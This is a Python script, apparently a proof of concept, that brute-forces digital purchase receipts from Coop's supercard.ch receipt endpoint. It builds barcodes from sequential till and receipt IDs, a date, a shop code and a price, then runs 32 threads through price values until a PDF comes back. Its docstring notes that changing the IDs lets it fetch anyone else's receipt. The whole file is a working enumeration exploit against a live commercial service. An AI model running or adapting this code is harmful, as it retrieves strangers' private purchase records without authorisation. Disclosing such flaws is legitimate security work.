# -*- coding: utf-8 -*-
import datetime
from datetime import date
from decimal import Decimal as D
import queue
from random import randint
import requests
import threading
import time


def fetch_receipt(url) -> bytes:
    """Fetches a PDF receipt from the URL."""
    response = requests.get(url)
    if not response.ok:
        raise Exception("The statement fetch request has failed. " +
                        f"Response reason: {response.reason}.")
    return response.content
def create_barcode(roll_no: int, id_no: int, date: date, cost: D,
                   shop: str) -> str:
    """Creates a valid Coop barcode.

    >>> create_barcode(23, 123, date(2022, 1, 1), D('3.50'), 1111)
    "9900230012301012200003501111"
    """
    PREFIX = '990'
    assert roll_no >= 0 and roll_no < 1000
    assert id_no >= 0 and id_no < 100000
    assert cost > 0 and cost.as_tuple().exponent == -2
    assert len(shop) == 4

    date_str = f'{date.day:02}{date.month:02}22'
    cost_int = int(str(cost).replace('.', ''))
    return f"{PREFIX}{roll_no:03}{id_no:05}{date_str}{cost_int:07}{shop}"


def create_url(barcode: str) -> str:
    return f'https://www.supercard.ch/bin/coop/kbk/kassenzettelpoc?barcode={barcode}&pdfType=receipt'


def fetch_from_barcode(barcode: str) -> bytes | None:
    RETRY_COUNT = 10
    for i in range(
            RETRY_COUNT):  # Retry a few times to avoid intermittent errors
        try:
            r = fetch_receipt(create_url(barcode))
        except:
            if i == RETRY_COUNT - 1:
                raise
            time.sleep(randint(3,15))
        else:
            break
    if len(r) > 8000:
        return r
    else:
        return None


def generate_barcodes() -> queue.Queue:
    """Generates barcodes to be searched for a valid receipt.

    I have chosen a particular values that find a receipt of mine, but
    it's possible to change the two initial IDs (they are not random but
    sequential) to search for anyone else's receipt.
    """
    barcodes = queue.Queue()
    cost = D('0.05')
    while cost < D('200.00'):
        barcodes.put(create_barcode(6, 1746, date(2022, 3, 24), cost, '1827'))
        cost += D('0.05')
    return barcodes


# Don't crash if an exception happens in a thread.
threading.excepthook = print


def main():
    THREAD_COUNT = 32

    barcodes = generate_barcodes()
    receipts = queue.Queue()
    def run():
        while True:
            try:
                barcode = barcodes.get(block=False)
            except queue.Empty:
                return None

            if not receipts.empty():
                return None

            print(f"Trying to fetch {barcode}")
            r = fetch_from_barcode(barcode)
            if r is not None:
                receipts.put(r)
                return None

    threads = []
    for i in range(THREAD_COUNT):
        threads.append(threading.Thread(target=run))
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    if receipts.empty():
        print("Could not find a valid receipt.")
    else:
        receipt = receipts.get()
        with open('receipt.pdf', 'wb') as f:
            print("Saving the receipt to receipt.pdf.")
            f.write(receipt)

if __name__ == '__main__':
    main()
